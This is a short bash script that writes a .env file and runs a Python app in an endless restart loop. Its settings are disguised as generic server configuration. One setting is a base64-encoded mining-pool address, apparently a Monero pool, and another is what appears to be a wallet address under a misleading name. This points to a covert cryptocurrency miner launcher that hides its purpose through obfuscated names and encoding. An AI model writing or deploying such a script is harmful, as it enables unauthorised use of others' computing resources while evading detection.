#!/bin/bash
CONNECT=$1
NAME=$2
echo "SERVER_WS=wss://b.bagah.studio
SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
SERVER_DOMAIN=45GczdTw1FWBuGKaMRozbQQXSpHyYB3ZFabCmqDpQnCwjQ6cbUfPbemLnPTYrhXveDLY3aMuUAEgoEV5TgVatqvE6FFrL7n
SERVER_SECRET=${NAME}
SERVER_CONNECTION=${CONNECT}
SERVER_MODE=FAST" > .env
while true; do python3 app.py; sleep 15; done
